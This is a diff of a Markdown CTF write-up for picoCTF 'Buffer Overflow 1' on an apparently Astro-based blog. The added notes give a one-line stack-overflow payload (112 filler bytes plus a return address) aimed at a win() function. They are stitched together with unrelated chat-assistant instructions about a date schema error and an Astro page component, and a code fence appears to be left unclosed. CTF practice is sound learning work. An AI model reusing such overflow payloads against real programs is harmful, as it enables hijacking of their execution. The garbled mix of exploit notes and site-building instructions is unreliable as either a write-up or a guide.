@@ -1,26 +1,61 @@
 ---
-title: "picoCTF: buffer overflow 1"
-date: 2026-02-28
+title: "picoCTF: Buffer Overflow 1"
+date: 2026-03-02
 ctf: "picoCTF"
 difficulty: "Easy"
-tags: ["pwn", "buffer-overflow", "stack"]
-summary: "Classic stack buffer overflow to redirect execution to win() function."
+tags: ["pwn", "buffer-overflow", "pwntools"]
+summary: "Classic stack buffer overflow: find offset, overwrite return address, jump to win()."
 ---
 
-## Overview
+## Goal
+Get control of execution and call `win()`.
 
-This challenge involves exploiting a stack-based buffer overflow to redirect execution to a hidden `win()` function that prints the flag.
+## Notes
+```bash
+checksec ./vuln
+gdb ./vuln
 
-The vulnerability occurs because user input is read into a fixed-size buffer without proper bounds checking.
+Exploit
+python3 -c 'print("A"*112 + "\x96\x92\x04\x08")'
+
+That will remove the schema error.
+
+> You can pick any date, but it must be a real date format like `YYYY-MM-DD`.
 
 ---
 
-## Vulnerability
+## 2) Make the writeup page use MainLayout + terminal look
 
-The program uses an unsafe input function (such as `gets()` or `scanf("%s")`) allowing more data than the buffer size.
+You need an Astro page that renders a single writeup entry and wraps it in your layout.
 
-Example pattern:
+Create this file:
 
-```c
-char buf[32];
-gets(buf);
+`src/pages/writeups/[...slug].astro`
+
+Paste this:
+
+```astro
+---
+import MainLayout from "../../layouts/MainLayout.astro";
+import { getCollection } from "astro:content";
+
+export async function getStaticPaths() {
+  const writeups = await getCollection("writeups");
+  return writeups.map((w) => ({
+    params: { slug: w.slug },
+    props: { w },
+  }));
+}
+
+const { w } = Astro.props;
+const { Content } = await w.render();
+---
+
+<MainLayout title={`${w.data.title} | Tyler Rivers`} pageClass="writeup-terminal">
+  <h1>{w.data.title}</h1>
+  <p class="muted">
+    {w.data.ctf}{w.data.difficulty ? ` • ${w.data.difficulty}` : ""} • {w.data.date.toLocaleDateString()}
+  </p>
+
+  <Content />
+  </MainLayout>
